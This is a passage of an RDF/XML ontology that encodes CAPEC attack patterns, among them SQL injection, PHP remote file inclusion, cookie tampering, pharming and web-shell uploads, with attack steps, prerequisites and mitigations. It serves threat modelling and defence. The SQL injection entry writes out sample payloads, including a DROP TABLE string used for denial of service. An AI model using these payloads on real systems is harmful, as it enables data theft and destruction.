          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey application) The attacker first takes an inventory of the functionality exposed by the application.TECHNIQUE:Spider web sites for all available links:TECHNIQUE:Sniff network communications with application using a utility such as WireShark.::STEP:2:PHASE:Experiment:DESCRIPTION:(Determine user-controllable input susceptible to injection) Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection  attempt to inject characters that have special meaning in SQL (such as a single quote character  a double quote character  two hyphens  a parenthesis  etc.). The goal is to create a SQL query with an invalid syntax.TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data  TamperIE  WebScarab etc. to modify HTTP POST parameters  hidden fields  non-freeform fields  etc.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Experiment:DESCRIPTION:(Experiment with SQL Injection vulnerabilities) After determining that a given input is vulnerable to SQL Injection  hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database  or to modify or delete information in the database.TECHNIQUE:Use public resources such as SQL Injection Cheat Sheet at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/  and try different approaches for adding logic to SQL queries.:TECHNIQUE:Add logic to query  and use detailed error messages from the server to debug the query. For example  if adding a single quote to a query causes an error message  try : &apos; OR 1=1; --  or something else that would syntactically complete a hypothesized query. Iteratively refine the query.:TECHNIQUE:Use Blind SQL Injection techniques to extract information about the database schema.:TECHNIQUE:If a denial of service attack is the goal  try stacking queries. This does not work on all platforms (most notably  it does not work on Oracle or MySQL). Examples of inputs to try include: &apos;; DROP TABLE SYSOBJECTS; -- and &apos;); DROP TABLE SYSOBJECTS; --. These particular queries will likely not work because the SYSOBJECTS table is generally protected.::STEP:4:PHASE:Exploit:DESCRIPTION:(Exploit SQL Injection vulnerability) After refining and adding various logic to SQL queries  craft and execute the underlying SQL query that will be used to attack the target system. The goal is to reveal  modify  and/or delete database data  using the knowledge obtained in the previous step. This could entail crafting and executing multiple SQL queries if a denial of service attack is the intent.TECHNIQUE:Craft and Execute underlying SQL query::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Protect environment variables against unauthorized read and write access.::Protect the configuration files which contain environment variables against illegitimate read and write access.::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.::Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack438">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#13">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:77::NATURE:CanPrecede:CAPEC ID:14::NATURE:PeerOf:CAPEC ID:10::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Subverting Environment Variable Values"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::353::285::302::74::15::73::20::200::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The attacker probes the application for information. Which version of the application is running? Are there known environment variables? etc.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker gains control of an environment variable and ties to find out what process(es) the environment variable controls.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker modifies the environment variable to abuse the normal flow of processes or to gain access to privileged resources.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker406">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#193">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:253::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#PHP Remote File Inclusion"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack406">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#193"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::98::80::714::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey application) Using a browser or an automated tool  an adversary follows all public links on a web site. He records all the links he finds.TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser&apos;s plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt variations on input parameters) The attack variants make use of a remotely available PHP script that generates a uniquely identifiable output when executed on the target application server. Possibly using an automated tool  an adversary requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads which include a reference to the remote PHP script. He records all the responses from the server that include the output of the execution of remote PHP script.TECHNIQUE:Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of PHP remote file inclusion payloads which include a reference to the adversary controlled remote PHP script.:TECHNIQUE:Use a proxy tool to record results of manual input of remote file inclusion probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:(Run arbitrary server-side code) As the adversary succeeds in exploiting the vulnerability  they are able to execute server-side code within the application. The malicious code has virtual access to the same resources as the targeted application. Note that the adversary might include shell code in their script and execute commands on the server under the same privileges as the PHP runtime is running with.TECHNIQUE:Develop malicious PHP script that is injected through vectors identified during the Experiment Phase and executed by the application server to execute a custom PHP script.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::98::80::714::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target application server must allow remote files to be included in the require  include  etc. PHP directives::The adversary must have the ability to make HTTP requests to the target web application.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To inject the malicious payload in a web page:LEVEL:Low::SKILL:To bypass filters in the application:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker6">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#30">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:233::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Hijacking a Privileged Thread of Execution"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack6">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#30"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::270::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Adversary determines the underlying system thread that is subject to user-control::STEP:2:PHASE:Experiment:DESCRIPTION:Adversary then provides input  perhaps by way of environment variables for the process in question  that affect the executing thread::STEP:3:PHASE:Exploit:DESCRIPTION:Upon successful hijacking  the adversary enjoys elevated privileges  and can possibly have the hijacked thread do his bidding::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::270::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application in question employs a threaded model of execution with the threads operating at  or having the ability to switch to  a higher privilege level than normal users::In order to feasibly execute this class of attacks  the adversary must have the ability to hijack a privileged thread.This ability includes  but is not limited to  modifying environment variables that affect the process the thread belongs to  or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.This does not preclude network-based attacks  but makes them conceptually more difficult to identify and execute.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Hijacking a thread involves knowledge of how processes and threads function on the target platform  the design of the target application as well as the ability to identify the primitives to be used or manipulated to hijack the thread.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. The adversary needs to be able to latch onto a privileged thread. The adversary does  however  need to be able to program  compile  and link to the victim binaries being executed so that it will turn control of a privileged thread over to the adversary&apos;s malicious code. This is the case even if the adversary conducts the attack remotely.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Avoid interacting with suspicious sites or clicking suspicious links. An organization should provide regular  robust cybersecurity training to its employees.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack122">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#173">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Action Spoofing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Action spoofing can result in a wide variety of consequences and negatively affect all three elements of the security triad.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker405">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#618">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cellular Broadcast Message Request"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack405">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#618"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::201::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:OtherTECHNICAL IMPACT:Other:NOTE:Other Other An attacker could verify that the target is in (or not in) a given location.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::201::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must have knowledge of the target’s mobile phone number.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Open source and commercial tools are available for this attack.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker5">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#481"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack5"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An adversary must be aware that their message will be routed using a CDN  and that both of the contradictory domains are served from that CDN.::If the purpose of the Domain Fronting is to hide redirected C2 traffic  the C2 server must have been created in the CDN.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary must have some knowledge of how messages are routed.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker226">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#398"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack226"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to calculate a card checksum and write out a valid checksum value. Some cards are protected by a checksum calculation  therefore it is necessary to determine what algorithm is being used to calculate the checksum and to employ that algorithm to calculate and write a new valid checksum for the card being created.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Make sure your web server is up-to-date with all patches to protect against known vulnerabilities. Insure that the file permissions in directories on the web server from which files can be execute is set to the least privilege settings  and that those directories contents is controlled by a whitelist.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack368">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#650">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:17::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Upload a Web Shell to a Web Server"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::287::553::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker359">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#539"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack359"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must have working knowledge of some if not all of the components involved in the target system as well as the infrastructure and development environment of the manufacturer.::Advanced knowledge about the ASIC installed within the target system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Able to develop and manufacture malicious subroutines for an ASIC environment without degradation of existing functions and processes.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker0">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#628"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack0"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target must be relying on valid GPS signal to perform critical operations.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack requires advanced knoweldge in GPS technology.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker358">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#516"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack358"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker will need either physical access or be able to supply malicious hardware components to the product development facility.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Intelligence data on victim&apos;s purchasing habits.:LEVEL:Medium::SKILL:Resources to maliciously construct/alter hardware components used for testing by the supplier.:LEVEL:High::SKILL:Resources to physically infiltrate supplier.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker225">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#399"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack225"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use input validation for cookies::Design: Generate and validate MAC for cookies::Implementation: Use SSL/TLS to protect cookie in transit::Implementation: Ensure the web server implements all relevant security patches  many exploitable buffer overflows are fixed in patches issued for the software.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack460">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#31">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:39::NATURE:ChildOf:CAPEC ID:150::NATURE:ChildOf:CAPEC ID:157::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Accessing/Intercepting/Modifying HTTP Cookies"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::565::302::311::113::539::20::315::384::472::724::602::642::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Obtain copy of cookie) The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege  or could be somebody sniffing on a network to get a copy of HTTP cookies.TECHNIQUE:Obtain cookie from local filesystem (e.g. C:Documents and Settings*Cookies and C:Documents and Settings*Application DataMozillaFirefoxProfiles*cookies.txt in Windows):TECHNIQUE:Sniff cookie using a network sniffer such as Wireshark:TECHNIQUE:Obtain cookie from local memory or filesystem using a utility such as the Firefox Cookie Manager or AnEC Cookie Editor.:TECHNIQUE:Steal cookie via a cross-site scripting attack.:TECHNIQUE:Guess cookie contents if it contains predictable information.::STEP:2:PHASE:Experiment:DESCRIPTION:(Obtain sensitive information from cookie) The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users  and thus  may have put potentially sensitive information in them.TECHNIQUE:If cookie shows any signs of being encoded using a standard scheme such as base64  decode it.:TECHNIQUE:Analyze the cookie&apos;s contents to determine whether it contains any sensitive information.::STEP:3:PHASE:Experiment:DESCRIPTION:(Modify cookie to subvert security controls.) The adversary may be able to modify or replace cookies to bypass security controls in the application.TECHNIQUE:Modify logical parts of cookie and send it back to server to observe the effects.:TECHNIQUE:Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.:TECHNIQUE:Modify cookie bitwise and send it back to server to observe the effects.:TECHNIQUE:Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a points balance for a given user where the points have some value. The user may spend his points and then replace his cookie with an older one to restore his balance.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker2">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#89">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:151::NATURE:CanFollow:CAPEC ID:89::NATURE:CanFollow:CAPEC ID:543::NATURE:CanFollow:CAPEC ID:611::NATURE:CanFollow:CAPEC ID:630::NATURE:CanFollow:CAPEC ID:631::NATURE:CanFollow:CAPEC ID:632::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Pharming"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack2">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#89"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::346::350::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Exploit:DESCRIPTION:Attacker sets up a system mocking the one trusted by the users. This is usually a website that requires or handles sensitive information.::STEP:2:PHASE:Exploit:DESCRIPTION:The attacker then poisons the resolver for the targeted site. This is achieved by poisoning the DNS server  or the local hosts file  that directs the user to the original website::STEP:3:PHASE:Exploit:DESCRIPTION:When the victim requests the URL for the site  the poisoned records direct the victim to the attackers&apos; system rather than the original one.::STEP:4:PHASE:Exploit:DESCRIPTION:Because of the identical nature of the original site and the attacker controlled one  and the fact that the URL is still the original one  the victim trusts the website reached and the attacker can now farm sensitive information such as credentials or account numbers.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::346::350::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Vulnerable DNS software or improperly protected hosts file or router that can be poisoned::A website that handles sensitive information but does not use a secure connection and a certificate that is valid is also prone to pharming::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker needs to be able to poison the resolver - DNS entries or local hosts file or router entry pointing to a trusted DNS server - in order to successfully carry out a pharming attack. Setting up a fake website  identical to the targeted one  does not require special skills.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. Having knowledge of the way the target site has been structured  in order to create a fake version  is required. Poisoning the resolver requires knowledge of a vulnerability that can be exploited.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker224">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#190"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack224"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::912::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Access to the target file such that it can be analyzed with the appropriate tools. A range of tools suitable for analyzing an executable or its operations::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker357">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#532"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack357"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Advanced knowledge about the installed target system design.::Advanced knowledge about the download and update installation processes.::Access to the download and update system(s) used to deliver BIOS images.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Able to develop a malicious BIOS image with the original functionality as a normal BIOS image  but with added functionality that allows for later compromise and/or disruption.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker1">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#142">
        <j.0:relatedPattern>
